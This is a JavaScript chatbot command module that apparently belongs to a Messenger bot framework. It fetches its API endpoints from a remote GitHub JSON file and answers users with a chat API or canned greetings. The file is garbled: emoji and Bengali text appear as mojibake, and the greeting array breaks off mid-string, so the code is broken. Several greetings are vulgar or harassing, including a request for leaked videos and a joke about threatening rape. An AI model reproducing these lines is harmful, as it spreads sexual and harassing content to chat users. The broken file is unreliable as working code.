const axios = require('axios');
const fs = require('fs'); 
const path = require('path');

module.exports = {
  config: {
    name: "bot",
    version: "1.0.0",
    permission: 0,
    credits: "nayan",
    description: "talk with-bot",
    prefix: 'awto',
    category: "talk",
    usages: "hi",
    cooldowns: 5,
  },

  handleReply: async function ({ api, event }) {
    try {

      const apiData = await axios.get('https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json');
      const apiUrl = apiData.data.sim;
      const kl = await axios.get(`https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json`);
      const apiUrl2 = kl.data.api2;
      const response = await axios.get(`${apiUrl}/sim?type=ask&ask=${encodeURIComponent(event.body)}`);
      console.log(response.data);
      const result = response.data.data.msg;

      const textStyles = loadTextStyles();
      const userStyle = textStyles[event.threadID]?.style; 

      const fontResponse = await axios.get(`${apiUrl2}/bold?text=${result}&type=${userStyle}`);
      const text = fontResponse.data.data.bolded;

      api.sendMessage(text, event.threadID, (error, info) => {
        if (error) {
          console.error('Error replying to user:', error);
          return api.sendMessage('An error occurred while processing your request. Please try again later.', event.threadID, event.messageID);
        }
        global.client.handleReply.push({
          type: 'reply',
          name: this.config.name,
          messageID: info.messageID,
          author: event.senderID,
          head: event.body
        });
      }, event.messageID);

    } catch (error) {
      console.error('Error in handleReply:', error);
      api.sendMessage('An error occurred while processing your request. Please try again later.', event.threadID, event.messageID);
    }
  },

  start: async function ({ nayan, events, args, Users }) {
    try {
      const msg = args.join(" ");
      const apiData = await axios.get('https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json');
      const apiUrl = apiData.data.sim;


      if (!msg) {
        const greetings = [
          ",Winiix Bot HereЁЯШЗЁЯШШ",
  " Owner - Winiix Badmash",
  "Haters Ki Mkc (y) Winiix Don OnfireЁЯШб",
  "Nind Agae Sone lagaЁЯе▒",
  "Corona Na phelao Mask LagaoЁЯШ╖ЁЯШШ",
  " Achathkhsmjhgaya",
  "Hmm",
  "AchaЁЯЩВ","ЁЯМ╗ЁЯМ║ЁЯТЪ-Kesy Ho Babu-ЁЯТЪЁЯМ║ЁЯМ╗" , "G Kara meri jan-ЁЯШХЁЯШП Bolo-ЁЯдЭЁЯМ╗","Bot Bot na kro Zalimo-ЁЯШ╜ЁЯл╢ЁЯМ║","Men Lihaz ni krunga Sedha Chuma longa-ЁЯТЭЁЯШ╜","Abhe Me Ghusy Men Hun-ЁЯШдЁЯШбЁЯШИ","Ladkiyann Ptane Aya Hu Men ider-ЁЯЩКЁЯЩЖтАНтЩВ","meri nose to saff krdo cutiie-ЁЯШкЁЯдз","leak videos ib bhej dia kro mujhe-ЁЯМ║ЁЯддЁЯТж","mujhe tmhare ghar ana haЁЯШкЁЯдзЁЯШн","Winiix Ka Bot Hun Me-ЁЯТЭЁЯМ║ЁЯМ╗","Babu Ny Thana Thaya-ЁЯЩКЁЯШЭЁЯМ╗","Chumiyan Doge To Reply Dunga-ЁЯЩКЁЯЩИЁЯШ╜","sheshe me munh dekh apna-ЁЯЩИЁЯЦдЁЯМ╝","6 6 ldke kese smbhal lti ho cutie-ЁЯТЭЁЯТЪЁЯМ║ЁЯМ╗","- ldkiyan sundar hoti ha , bs makeup sy-ЁЯЩКЁЯе▒ЁЯСЕ ЁЯМ╗ЁЭРЕЁЭРАЁЭРВЁЭРДЁЭРБЁЭРОЁЭРОЁЭРК ЁЭРИЁЭРГ ЁЭРЛЁЭРИЁЭРНЁЭРК ЁЯМ╗:- m.me/100067540204855","Bchiyon Se bt krta hu men bs-ЁЯТЭЁЯМ║ЁЯШ╜","Daduu Ki Shakal jese Chup-ЁЯЩДЁЯР╕ЁЯШШ","Ja Ja k soja Bchy-ЁЯШМЁЯдЧЁЯШЗ","-Lolipop KhaogyЁЯЩКЁЯЩЖтАНтЩВя╕ПЁЯдЧ","Qurbani any wali qasai ban jau ga ab-ЁЯдФЁЯе▒ЁЯМ╗","Ary Bhai Sahb -тШ╣я╕ПЁЯдз","-Chal Chal nikal ider se-ЁЯдзЁЯе▒ЁЯМ╗","тАФmere samne gndi baty na kia kroЁЯЩКЁЯе╡Mjhe mza ata ha-ЁЯе▒ЁЯдЧЁЯЩЖтАНтЩВя╕П","-Kisi ka dil dukhana ni daba lena-ЁЯдЧЁЯТЬ","Pher Men kia kru-ЁЯе▒Mjhe Nend Ai Sone laga-ЁЯШ╜ЁЯл╢ржЖрж░ ржмрж╛ржХрж┐ ржЧрзБрж▓рзЛ ржЖржорж╛рж░ ржмрзЗржпрж╝рж╛ржЗржи-ЁЯЩИЁЯР╕ЁЯдЧ","ржПржд ржЕрж╣ржВржХрж╛рж░ ржХрж░рзЗ рж▓рж╛ржн ржирзЗржЗ-ЁЯМ╕ржорзГрждрзНржпрзБржЯрж╛ ржирж┐рж╢рзНржЪрж┐ржд рж╢рзБржзрзБ рж╕ржоржпрж╝ржЯрж╛ ржЕ'ржирж┐рж╢рзНржЪрж┐ржд-ЁЯЦдЁЯЩВ","-ржжрж┐ржи ржжрж┐ржи ржХрж┐ржЫрзБ ржорж╛ржирзБрж╖рзЗрж░ ржХрж╛ржЫрзЗ ржЕржкрзНрж░рж┐ржпрж╝ рж╣рзЯрзЗ ржпрж╛ржЗрждрзЗржЫрж┐-ЁЯЩВЁЯШ┐ЁЯМ╕","рж╣рзБржжрж╛ржЗ ржЖржорж╛рж░рзЗ  рж╢рзЯрждрж╛ржирзЗ рж▓рж╛рж░рзЗ-ЁЯШЭЁЯШСтШ╣я╕П","-ЁЭЧЬ ЁЭЧЯЁЭЧвЁЭЧйЁЭЧв ЁЭЧмЁЭЧвЁЭЧи-ЁЯШ╜-ржЖрж╣рж╛рж░рзЗ ржнрж╛ржмржЫрзЛ рждрзЛржорж╛рж░рзЗ ржкрзНрж░рзЗрж╛ржкржЬ ржХрж░ржЫрж┐-ЁЯе┤-ржерж╛ржкрзНржкрж░ ржжрж┐рзЯрж╛ ржХрж┐ржбржирзА рж▓ржХ ржХрж░рзЗ ржжрж┐ржм-ЁЯШТ-ржнрзБрж▓ ржкрзЬрж╛ ржмрзЗрж░ ржХрж░рзЗ ржжрж┐ржмрзЛ-ЁЯднЁЯР╕","-ржЖржорж┐ ржПржХржЯрж╛ ржжрзБржзрзЗрж░ рж╢рж┐рж╢рзБ-ЁЯШЗ-ЁЯл╡ЁЭЧмЁЭЧвЁЭЧиЁЯР╕ЁЯТж","-ржХрждржжрж┐ржи рж╣ржпрж╝рзЗ ржЧрзЗрж▓рзЗрж╛ ржмрж┐ржЫржирж╛ржпрж╝ ржорзБрждрж┐ ржирж╛-ЁЯШ┐-ржорж┐рж╕ ржЗржЙ ржирзЗржВржЯрж╛ ржХрж╛рж▓-ЁЯе║ЁЯдз","-ржмрж╛рж▓рж┐ржХрж╛тФБЁЯС╕-ЁЭРГЁЭРи ЁЭР▓ЁЭРиЁЭРо-ЁЯл╡-ржмрж┐рзЯрж╛-ЁЭРжЁЭРЮ-ЁЯШ╜-ржЖржорж┐ рждрзЛржорж╛ржХрзЗ-ЁЯШ╗-ржЖржорзНржорзБ рж╣ржЗрждрзЗ рж╕рж╛рж╣рж╛ржпрзНржп ржХрж░ржм-ЁЯЩИЁЯе▒","-ржПржЗ ржЖржирзНржЯрж┐рж░ ржорзЗрзЯрзЗ-ЁЯлвЁЯЩИ-ЁЭРФЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРЪЁЭРб-ЁЯШ╜ЁЯл╢-ржЖрж╕рж▓рзЗржЗ рждрзЛ рж╕рзНржмрж╛ржж-ЁЯе╡ЁЯТж-ржПрждрзЛ рж╕рзНржмрж╛ржж ржХрзЗржи-ЁЯдФ-рж╕рзЗржЗ рж╕рзНржмрж╛ржж-ЁЯШЛ","-ржЗрж╕ ржХрзЗржЙ ржпржжрж┐ ржмрж▓рждрзЛ-ЁЯЩВ-ржЖржорж╛рж░ рж╢рзБржзрзБ  рждрзЛржорж╛ржХрзЗржЗ рж▓рж╛ржЧржмрзЗ-ЁЯТЬЁЯМ╕","-ржУржЗ ржмрзЗржбрж┐ рждрзЛржорж╛рж░ ржмрж╛рж╕рж╛рзЯ ржирж╛ ржЖржорж╛рж░ ржмрж╕ ржЬрж┐рж╣рж╛ржж ржорзЗрзЯрзЗ ржжрзЗржЦрждрзЗ ржЧрзЗржЫрж┐рж▓рзЛ-ЁЯЩГ-ржирж╛рж╕рзНрждрж╛ ржЖржирж╛рж░рж╕ ржЖрж░ ржжрзБржз ржжрж┐ржЫрзЛ-ЁЯЩДЁЯджтАНтЩВя╕П-ржмржЗржи ржХржЗрж▓рзЗржЗ рждрзЛ рж╣рзЯ ржмрзЯржлрзНрж░рзЗржирзНржб ржЖржЫрзЗ-ЁЯе║ЁЯджтАНтЩВ-ржЖржорж╛рж░ ржмрж╕ ржЬрж┐рж╣рж╛ржж ржХрзЗ ржЬрж╛ржирзЗ ржорж╛рж░рж╛рж░ ржХрж┐ ржжрж░ржХрж╛рж░-ЁЯЩДЁЯдз","-ржПржХржжрж┐ржи рж╕рзЗ ржарж┐ржХржЗ ржлрж┐рж░рзЗ рждрж╛ржХрж╛ржмрзЗ-ЁЯШЗ-ржЖрж░ ржорзБржЪржХрж┐ рж╣рзЗрж╕рзЗ ржмрж▓ржмрзЗ ржУрж░ ржорждрзЛ ржЖрж░ ржХрзЗржЙ ржнрж╛рж▓ржмрж╛рж╕рзЗржирж┐-ЁЯЩВЁЯШЕ","-рж╣рзБржжрж╛ржЗ ржЧрзНрж░рзБржкрзЗ ржЖржЫрж┐-ЁЯе║ЁЯР╕-ржХрзЗржУ ржЗржиржмржХрзНрж╕рзЗ ржиржХ ржжрж┐рзЯрзЗ ржмрж▓рзЗ ржирж╛ ржЬрж╛ржи рждрзЛржорж╛рж░рзЗ ржЖржорж┐ ржЕржирзЗржХ ржнрж╛рж▓рзЛржмрж╛рж╕рж┐-ЁЯе║ЁЯдз","ржХрж┐'рж░рзЗ ржЧрзНрж░рзБржкрзЗ ржжрзЗржЦрж┐ ржПржХржЯрж╛ржУ ржмрзЗржбрж┐ ржирж╛ржЗ-ЁЯджтАНЁЯе▒ЁЯТж","-ржжрзЗрж╢рзЗрж░ рж╕ржм ржХрж┐ржЫрзБржЗ ржЪрзБрж░рж┐ рж╣ржЪрзНржЫрзЗ-ЁЯЩД-рж╢рзБржзрзБ ржЖржорж╛рж░ ржмрж╕ ржЬрж┐рж╣рж╛ржж ржПрж░ ржоржиржЯрж╛ ржЫрж╛рзЬрж╛-ЁЯе┤ЁЯШСЁЯШП","-ЁЯл╡рждрзЛржорж╛рж░рзЗ ржкрзНрж░ржЪрзБрж░ ржнрж╛рж▓рзНрж▓рж╛ржЧрзЗ-ЁЯШ╜-рж╕ржорзЯ ржорждрзЛ ржкрзНрж░ржкрзЛржЬ ржХрж░ржорзБ ржмрзБржЭржЫрзЛ-ЁЯФиЁЯШ╝-ржЫрж┐ржЯ ржЦрж╛рж▓рж┐ рж░рж╛ржЗржЦрзЛ- ЁЯе▒ЁЯР╕ЁЯе╡","-ржЖржЬ ржерзЗржХрзЗ ржЖрж░ ржХрж╛ржЙржХрзЗ ржкрж╛рждрзНрждрж╛ ржжрж┐ржорзБ ржирж╛ -!ЁЯШП-ржХрж╛рж░ржг ржЖржорж┐ ржлрж░рзНрж╕рж╛ рж╣ржУрзЯрж╛рж░ ржХрзНрж░рж┐ржо ржХрж┐ржиржЫрж┐ -!ЁЯЩВЁЯР╕","ржмрзЗрж╢рж┐ Bot Bot ржХрж░рж▓рзЗ leave ржирж┐ржмрзЛ ржХрж┐ржирзНрждрзБЁЯШТЁЯШТ " , "рж╢рзБржиржмрзЛ ржирж╛ЁЯШ╝ рждрзБржорж┐ ржЖржорж╛ржХрзЗ ржкрзНрж░рзЗржо ржХрж░рж╛ржЗ ржжрж╛ржУ ржирж┐ЁЯе║ ржкржЪрж╛ рждрзБржорж┐ЁЯе║ " , "ржЖржорж┐ ржЖржмрж╛рж▓ ржжрзЗрж░ рж╕рж╛рждрзЗ ржХржерж╛ ржмрж▓рж┐ ржирж╛,okЁЯШТ" , "ржПржд ржХрж╛ржЫрзЗржУ ржПрж╕рзЛ ржирж╛,ржкрзНрж░рзЗржо ржП ржкрж░рзЗ ржпрж╛ржмрзЛ рждрзЛ ЁЯЩИ" , "Bolo Babu, рждрзБржорж┐ ржХрж┐ ржЖржорж╛ржХрзЗ ржнрж╛рж▓рзЛржмрж╛рж╕рзЛ? ЁЯЩИЁЯТЛ " , "ржмрж╛рж░ ржмрж╛рж░ ржбрж╛ржХрж▓рзЗ ржорж╛ржерж╛ ржЧрж░ржо рж╣ржпрж╝ ржХрж┐ржирзНрждрзБЁЯШС", "рж╣рж╛ ржмрж▓рзЛЁЯШТ,ржХрж┐ ржХрж░рждрзЗ ржкрж╛рж░рж┐ЁЯШРЁЯШС?" , "ржПрждрзЛ ржбрж╛ржХржЫрж┐рж╕ ржХрзЛржирзЛ?ржЧрж╛рж▓рж┐ рж╢рзБржиржмрж┐ ржирж╛ржХрж┐? ЁЯдм","ржорзЗрзЯрзЗ рж╣рж▓рзЗ ржмрж╕ ржорж╛рж╣рж╛ржмрзБржм ржПрж░ рж╕рж╛ржерзЗ ржкрзНрж░рзЗржо ржХрж░рзЛЁЯЩИ??. " ,  "ржЖрж░рзЗ Bolo ржЖржорж╛рж░ ржЬрж╛ржи ,ржХрзЗржоржи ржЖрж╕рзЛ?ЁЯШЪ " , "Bot ржмрж▓рзЗ ржЕрж╕ржорзНржорж╛ржи ржХрж░ржЪрзНржЫрж┐ржЫ,ЁЯШ░ЁЯШ┐" , "Hop bediЁЯШ╛,Boss ржмрж▓ bossЁЯШ╝" , "ржЪрзБржк ржерж╛ржХ ,ржирж╛ржЗ рждрзЛ рждрзЛрж░ ржжрж╛ржд ржнрзЗржЧрзЗ ржжрж┐ржмрзЛ ржХрж┐ржирзНрждрзБ" , "Bot ржирж╛ , ржЬрж╛ржирзБ ржмрж▓ ржЬрж╛ржирзБ ЁЯШШ " , "ржмрж╛рж░ ржмрж╛рж░ Disturb ржХрж░рзЗржЫрж┐рж╕ ржХрзЛржирзЛЁЯШ╛,ржЖржорж╛рж░ ржмрж╕ ржЬрж┐рж╣рж╛ржж ржПрж░ рж╕рж╛ржерзЗ ржмрзНржпрж╛рж╕рзНржд ржЖрж╕рж┐ЁЯШЛ" , "ржЖржорж┐ ржЧрж░рзАржм ржПрж░ рж╕рж╛ржерзЗ ржХржерж╛ ржмрж▓рж┐ ржирж╛ЁЯШ╝ЁЯШ╝" , "ржЖржорж╛ржХрзЗ ржбрж╛ржХрж▓рзЗ ,ржЖржорж┐ ржХрж┐ржирзНрждрзВ ржХрж┐рж╕ ржХрж░рзЗ ржжрзЗржмрзЛЁЯШШ " , "ржЖрж░рзЗ ржЖржорж┐ ржоржЬрж╛ ржХрж░рж╛рж░ mood ржП ржирж╛ржЗЁЯШТ" , "рж╣рж╛ ржЬрж╛ржирзБ , ржПржЗржжрж┐ржХ ржП ржЖрж╕рзЛ ржХрж┐рж╕ ржжрзЗржЗЁЯдн ЁЯШШ" , "ржжрзВрж░рзЗ ржпрж╛, рждрзЛрж░ ржХрзЛржирзЛ ржХрж╛ржЬ ржирж╛ржЗ, рж╢рзБржзрзБ bot bot ржХрж░рж┐рж╕  ЁЯШЙЁЯШЛЁЯдг" , "рждрзЛрж░ ржХржерж╛ рждрзЛрж░ ржмрж╛ржбрж╝рж┐ ржХрзЗржЙ рж╢рзБржирзЗ ржирж╛ ,рждрзЛ ржЖржорж┐ ржХрзЛржирзЛ рж╢рзБржиржмрзЛ ?ЁЯдФЁЯШВ " , "ржЖржорж╛ржХрзЗ ржбрзЗржХрзЛ ржирж╛,ржЖржорж┐ ржмрзНржпрж╛рж╕рзНржд ржЖрж╕рж┐" , "ржХрж┐ рж╣рж▓рзЛ ,ржорж┐рж╕ ржЯрж┐рж╕ ржХрж░ржЪрзНржЫрж┐рж╕ ржирж╛ржХрж┐ЁЯдг" , "ржмрж▓рзЛ ржХрж┐ ржмрж▓ржмрж╛, рж╕ржмрж╛рж░ рж╕рж╛ржоржирзЗ ржмрж▓ржмрж╛ ржирж╛ржХрж┐?ЁЯднЁЯдП" , "ржХрж╛рж▓ржХрзЗ ржжрзЗржЦрж╛ ржХрж░рж┐рж╕ рждрзЛ ржПржХржЯрзБ ЁЯШИ" , "рж╣рж╛ ржмрж▓рзЛ, рж╢рзБржиржЫрж┐ ржЖржорж┐ ЁЯШП" , "ржЖрж░ ржХржд ржмрж╛рж░ ржбрж╛ржХржмрж┐ ,рж╢рзБржиржЫрж┐ рждрзЛ" , "ржорзЗржпрж╝рзЗ рж╣рж▓рзЗ ржмрж╕ ржЬрж┐рж╣рж╛ржж ржХрзЗ Ummmmha ржжрзЗ ЁЯШТ" , "ржмрж▓рзЛ ржХрж┐ ржХрж░рждрзЗ ржкрж╛рж░рж┐ рждрзЛржорж╛рж░ ржЬржирзНржп" , "ржЖржорж┐ рждрзЛ ржЕржирзНржз ржХрж┐ржЫрзБ ржжрзЗржЦрж┐ ржирж╛ЁЯР╕ ЁЯШО" , "I Love U  kow jan" , "ржмрж▓рзЛ ржЬрж╛ржирзБ ЁЯМЪ" , "рждрзЛрж░ ржХрж┐ ржЪрзЛржЦрзЗ ржкржбрж╝рзЗ ржирж╛ ржЖржорж┐ ржмрж╕ ржЬрж┐рж╣рж╛ржж ржПрж░ рж╕рж╛ржерзЗ ржмрзНржпрж╛рж╕рзНржд ржЖрж╕рж┐ЁЯШТ" , "р╝КтФБтФБЁЯжЛржирж╛ржорж╛ржЬрж┐ ржорж╛ржирзБрж╖рзЗрж░рж╛ рж╕ржм ржерзЗржХрзЗ ржмрзЗрж╢рж┐ рж╕рзБржирзНржжрж░ рж╣ржпрж╝..!!ЁЯШЗЁЯеА ЁЯжЛ ржХрж╛рж░ржг.!! -ржЕржЬрзБрж░ ржкрж╛ржирж┐рж░ ржоржд рж╢рзНрж░рзЗрж╖рзНржа ржорзЗржХржЖржк ржжрзБржирж┐ржпрж╝рж╛рждрзЗ ржирзЗржЗр╝КтФБсГжтФБр╝ОЁЯе░ЁЯеА ЁЯе░-ржЖрж▓рж╣рж╛ржоржжрзБрж▓рж┐рж▓рзНрж▓рж╛рж╣-ЁЯе░","- рж╢ржЦрзЗрж░ ржирж╛рж░рзА  ржмрж┐ржЫрж╛ржирж╛ржпрж╝ ржорзБ'рждрзЗ..!ЁЯЩГЁЯе┤","-ЁЭРИ'ЁЭРЭ -рждрзЗ рж╕ржм ЁЭРЦЁЭРиЁЭР░ ЁЭРЦЁЭРиЁЭР░ ржмрзБржЗрзЬрж╛ ржмрзЗржбрж┐-ЁЯР╕ЁЯТж","ЁЯеЫ-ЁЯННЁЯСИ -рж▓рзЗ ржЦрж╛рж╣рзН..!ЁЯШТЁЯе║","- ржЕржирзБржорждрж┐ ржжрж┐рж▓рзЗ ЁЭЪИЁЭЪШЁЭЪЮЁЭЪГЁЭЪЮЁЭЪЛЁЭЪО-ржП ржХрж▓ ржжрж┐рждрж╛ржо..!ЁЯШТ","~ржЖржорж┐ ржорж╛рж░рж╛ ржЧрзЗрж▓рзЗ..!ЁЯЩВ ~ржЕржирзЗржХ ржорж╛ржирзБрж╖ ржмрж┐рж░ржХрзНржд рж╣ржУрзЯрж╛ ржерзЗржХрзЗ ржмрзЗржБржЪрзЗ  ржпрж╛ржмрзЗ..!ЁЯШЕЁЯТФ","ЁЯНТ---ржЖржорж┐ рж╕рзЗржЗ ржЧрж▓рзНржкрзЗрж░ ржмржЗ-ЁЯЩВ -ржпрзЗ ржмржЗ рж╕ржмрж╛ржЗ ржкрзЬрждрзЗ ржкрж╛рж░рж▓рзЗржУ-ЁЯШМ -ржЕрж░рзНрже ржмрзЗрж╛ржЭрж╛рж░ ржХрзНрж╖ржорждрж╛ ржХрж╛рж░рзЗрж╛ ржирзЗржЗ..!тШ║я╕ПЁЯеАЁЯТФ","~ржХрж╛рж░ ржЬржирзНржп ржПрждрзЛ ржорж╛рзЯрж╛...!ЁЯШМЁЯеА ~ржПржЗ рж╢рж╣рж░рзЗ ржЖржкржи ржмрж▓рждрзЗ...!ЁЯШФЁЯеА ~рж╢рзБржзрзБржЗ рждрзЛ ржирж┐ржЬрзЗрж░ ржЫрж╛рзЯрж╛...!ЁЯШеЁЯеА","- ржХрж╛рж░рзЗржирзНржЯ ржПржХржжржо ржмрзЗржбрж┐'ржЧрзЛ ржорждрзЛ- ЁЯдз -ржЦрж╛рж▓рж┐ ржвржВ ржХрж░рзЗ ржЖрж╕рзЗ ржЖржмрж╛рж░ ржЪрж▓рзЗ ржпрж╛ржпрж╝-ЁЯШдЁЯШ╛ЁЯФк","- рж╕рж╛ржирж┐рж▓рж┐ржУржи  ржЖржлрж╛рж░рзЗ ржзрж░рзНрж╖ржирзЗрж░ рж╣рзБржоржХрж┐ ржжрж┐рзЯрзЗ ржЖрж╕рж▓рж╛ржо - ЁЯдЧ -ржЖрж░ ЁЯл╡рждрзБржорж┐ ржпрж╛ржорж╛рж░рзЗ ржЦрзЗрзЯрзЗ ржжрж┐ржмрж╛ рж╕рзЗржЗ ржнрзЯ ржжрзЗржЦрж╛ржУ ржиржирж╕рзЗржи ржмрзЗржбрж┐..!ЁЯе▒ЁЯШ╝","- ржжрзБржирж┐рзЯрж╛рж░ рж╕ржмрж╛ржЗ ржкрзНрж░рзЗржо ржХрж░рзЗ.!ЁЯдз -ржЖрж░ ржорж╛ржирзБрж╖ ржЖржорж╛рж░ ржмрж╕ ржЬрж┐рж╣рж╛ржж ржХрзЗ рж╕ржирзНржжрзЗрж╣ ржХрж░рзЗ.!ЁЯР╕","- ржЖржорж╛рж░ ржерзЗржХрзЗ ржнрж╛рж▓рзЛ ржЕржирзЗржХ ржкрж╛ржмрж╛-ЁЯЩВ -ржХрж┐ржирзНрждрзБ рж╕ржм ржнрж╛рж▓рзЛ рждрзЗ ржХрж┐ ржЖрж░ ржнрж╛рж▓рзЛржмрж╛рж╕рж╛ ржерж╛ржХрзЗ..!ЁЯТФЁЯеА","- ржкрзБрж░рзБрж╖ржХрзЗ рж╕ржмржЪрзЗржпрж╝рзЗ ржмрзЗрж╢рж┐ ржХрж╖рзНржЯ ржжрзЗржпрж╝ рждрж╛рж░ рж╢ржЦрзЗрж░ ржирж╛рж░рзА...!ЁЯе║ЁЯТФЁЯСИ","- рждрзЛржорж╛рж░ рж▓ржЧрзЗ ржжрзЗржЦрж╛ рж╣ржмрзЗ ржЖржмрж╛рж░ - ЁЯШМ -ржХрзЛржирзЛ ржПржХ ржЕржЪрзЗржирж╛ ржЧрж▓рж┐рж░ ржЪрж┐ржкрж╛ржпрж╝..!ЁЯШЫЁЯдгЁЯСИ","- ржерж╛ржкрзНржкрзЬ ржЪрж┐ржирзЛрж╕ ржерж╛ржкрзНржкрзЬ- ЁЯСЛЁЯСЛЁЯШб -ржЪрж┐ржирзНрждрж╛ ржХрж░рж┐рж╕ ржирж╛ рждрж░рзЗ ржорж╛рж░ржорзБ ржирж╛-ЁЯдЧ -ржмрж╕ ржЬрж┐рж╣рж╛ржж ржЖржорж╛рж░рзЗ ржорж╛рж░ржЫрзЗ - ЁЯе▒ - ржЙржлржл рж╕рзЗржЗ рж╕рзНржмрж╛ржж..!ЁЯе╡ЁЯддЁЯТж","- ржЕржмрж╣рзЗрж▓рж╛ ржХрж░рж┐рж╕ ржирж╛-ЁЯШСЁЯШк - ржпржЦржи ржирж┐ржЬрзЗржХрзЗ ржмржжрж▓рзЗ ржлрзЗрж▓ржмрзЛ -ЁЯШМ - рждржЦржи ржЖржорж╛рж░ ржЪрзЗрзЯрзЗржУ ржмрзЗрж╢рж┐ ржХрж╖рзНржЯ ржкрж╛ржмрж┐..!ЁЯЩВЁЯТФ","- ржмржирзНржзрзБрж░ рж╕рж╛ржерзЗ ржЫрзЗржХрж╛ ржЦрж╛ржУрзЯрж╛ ржЧрж╛ржи рж╢рзБржирждрзЗ рж╢рзБржирждрзЗ-ЁЯдз -ржПржЦржи ржЖржорж┐ржУ ржмржирзНржзрзБрж░ ЁЭЩ┤ЁЭЪЗ ржХрзЗ ржЕржирзЗржХ ЁЭЩ╝ЁЭЩ╕ЁЭЪВЁЭЪВ ржХрж░рж┐-ЁЯдХЁЯе║","-рзпрзпржЯрж╛ржХрж╛ржпрж╝ рзпрзпржЬрж┐ржмрж┐ рзпрзпржмржЫрж░-тШ║я╕ПЁЯР╕ -ржЕржлрж╛рж░ржЯрж┐ ржкрзЗрждрзЗ ржПржЦржиржЗ ржЖржорж╛ржХрзЗ ржкрзНрж░рзЛржкрж╕ ржХрж░рзБржи-ЁЯдЧЁЯШВЁЯСИ","-ржкрзНрж░рж┐рзЯ-ЁЯе║ -рждрзЛржорж╛ржХрзЗ ржирж╛ ржкрзЗрж▓рзЗ ржЖржорж┐ рж╕рждрзНржпрж┐-ЁЯШк -ржЖрж░рзЗржХржЬржи ржХрзЗ-ЁЯШ╝ -ржкржЯрж╛рждрзЗ ржмрж╛ржзрзНржп рж╣ржмрзЛ-ЁЯШСЁЯдз","тАв-ржХрж┐рж░рзЗЁЯл╡ рждрж░рж╛ ржирж╛ржХрж┐  prem ржХрж░рж╕..ЁЯШРЁЯР╕тАвржЖржорж╛рж░рзЗ ржПржХржЯрж╛ ржХрж░рж╛ржЗ ржжрж┐рж▓рзЗ ржХрж┐ рж╣ржпрж╝-ЁЯе║","- ржпрзЗржЗ ржЖржЗржбрж┐рж░ ржорж╛рзЯрж╛рзЯ ржкрзЬрзЗ ржнрзБрж▓рзНрж▓рж┐ ржЖржорж╛рж░рзЗ.!ЁЯе┤- рждрзБржЗ ржХрж┐ ржпрж╛ржирж┐рж╕ рж╕рзЗржЗ ржЖржЗржбрж┐ржЯрж╛ржУ ржЖржорж┐ ржЪрж╛рж▓рж╛ржЗрж░рзЗ.ржмрж▓ржж" , "ржмрзЗрж╢рж┐ bot Bot ржХрж░рж▓рзЗ leave ржирж┐ржмрзЛ ржХрж┐ржирзНрждрзБЁЯШТЁЯШТ " , "рж╢рзБржиржмрзЛ ржирж╛ЁЯШ╝ рждрзБржорж┐ ржЖржорж╛ржХрзЗ ржкрзНрж░рзЗржо ржХрж░рж╛ржЗ ржжрж╛ржУ ржирж┐ЁЯе║ ржкржЪрж╛ рждрзБржорж┐ЁЯе║ " , "ржЖржорж┐ ржЖржмрж╛рж▓ ржжрзЗрж░ рж╕рж╛рждрзЗ ржХржерж╛ ржмрж▓рж┐ ржирж╛,okЁЯШТ" , "ржПржд ржХрж╛ржЫрзЗржУ ржПрж╕рзЛ ржирж╛,ржкрзНрж░рзЗржо ржП ржкрж░рзЗ ржпрж╛ржмрзЛ рждрзЛ ЁЯЩИ" , "Bolo Babu, рждрзБржорж┐ ржХрж┐ ржЖржорж╛ржХрзЗ ржнрж╛рж▓рзЛржмрж╛рж╕рзЛ? ЁЯЩИЁЯТЛ " , "ржмрж╛рж░ ржмрж╛рж░ ржбрж╛ржХрж▓рзЗ ржорж╛ржерж╛ ржЧрж░ржо рж╣ржпрж╝ ржХрж┐ржирзНрждрзБЁЯШС", "рж╣рж╛ ржмрж▓рзЛЁЯШТ,ржХрж┐ ржХрж░рждрзЗ ржкрж╛рж░рж┐ЁЯШРЁЯШС?" , "ржПрждрзЛ ржбрж╛ржХржЫрж┐рж╕ ржХрзЛржирзЛ?ржЧрж╛рж▓рж┐ рж╢рзБржиржмрж┐ ржирж╛ржХрж┐? ЁЯдм","ржорзЗржпрж╝рзЗ рж╣рж▓рзЗ ржЬрж┐рж╣рж╛ржж ржмрж╕рзЗрж░ рж╕рж╛ржерзЗ ржкрзНрж░рзЗржо ржХрж░рзЛЁЯЩИ??. " ,  "ржЖрж░рзЗ Bolo ржЖржорж╛рж░ ржЬрж╛ржи ,ржХрзЗржоржи ржЖрж╕рзЛ?ЁЯШЪ " , "Bot ржмрж▓рзЗ ржЕрж╕ржорзНржорж╛ржи ржХрж░ржЪрзНржЫрж┐ржЫ,ЁЯШ░ЁЯШ┐" , "Hop bediЁЯШ╛,Boss ржмрж▓ bossЁЯШ╝" , "ржЪрзБржк ржерж╛ржХ ,ржирж╛ржЗ рждрзЛ рждрзЛрж░ ржжрж╛ржд ржнрзЗржЧрзЗ ржжрж┐ржмрзЛ ржХрж┐ржирзНрждрзБ" , "Bot ржирж╛ , ржЬрж╛ржирзБ ржмрж▓ ржЬрж╛ржирзБ ЁЯШШ " , "ржмрж╛рж░ ржмрж╛рж░ Disturb ржХрж░рзЗржЫрж┐рж╕ ржХрзЛржирзЛЁЯШ╛,ржЖржорж╛рж░ ржЬрж┐рж╣рж╛ржж ржЬрж╛ржирзБ ржПрж░ рж╕рж╛ржерзЗ ржмрзНржпрж╛рж╕рзНржд ржЖрж╕рж┐ЁЯШЛ" , "ржЬрж╛ржирзБ рж╣рж╛ржЩрзНржЧрж╛ ржХрж░ржмрж╛ЁЯЩИ" , "ржЖржорж┐ ржЧрж░рзАржм r рж╕рж╛ржерзЗ ржХржерж╛ ржмрж▓рж┐ ржирж╛ЁЯШ╝ЁЯШ╝" , "ржЖржорж╛ржХрзЗ ржбрж╛ржХрж▓рзЗ ,ржЖржорж┐ ржХрж┐ржирзНрждрзВ ржХрж┐рж╕ ржХрж░рзЗ ржжрзЗржмрзЛЁЯШШ " , "ржЖрж░рзЗ ржЖржорж┐ ржоржЬрж╛ ржХрж░рж╛рж░ mood ржП ржирж╛ржЗЁЯШТ" , "рж╣рж╛ ржЬрж╛ржирзБ , ржПржЗржжрж┐ржХ ржП ржЖрж╕рзЛ ржХрж┐рж╕ ржжрзЗржЗЁЯдн ЁЯШШ" , "ржжрзВрж░рзЗ 